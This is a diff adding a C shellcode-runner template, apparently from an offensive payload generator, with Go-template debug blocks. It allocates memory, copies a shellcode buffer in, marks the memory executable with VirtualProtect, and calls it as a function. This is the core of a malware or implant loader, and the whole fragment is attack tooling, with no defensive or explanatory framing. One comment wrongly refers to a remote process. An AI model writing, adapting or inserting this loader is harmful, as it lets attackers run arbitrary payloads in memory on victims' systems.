@@ -1,0 +1,30 @@
+
+    // Allocate space in the remote process for the pathname
+    PVOID pBuffer = VirtualAlloc(0, sizeof(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+    if (pBuffer == NULL)
+    {
+        {{if .Debug}}
+        printf(TEXT("[-] Error: Could not allocate memory inside PID.\n"));
+        {{end}}
+        return(1);
+    }
+
+    memcpy(pBuffer, shellcode, sizeof(shellcode));
+
+    DWORD oldMemPerms;
+    if (!VirtualProtect(pBuffer, sizeof(shellcode), PAGE_EXECUTE_READ, &oldMemPerms))
+    {
+        {{if .Debug}}
+        printf(TEXT("[-] Error: VirtualProtect - could not change memory to executable\n"));
+        {{end}}
+        return(1);
+    }
+
+    // cast to fp, execute
+    int(*exec)() = (int(*)())(pBuffer);
+    exec();
+
+    if (pBuffer != NULL)
+        VirtualFree(pBuffer, 0, MEM_RELEASE);
+
+    return 0;
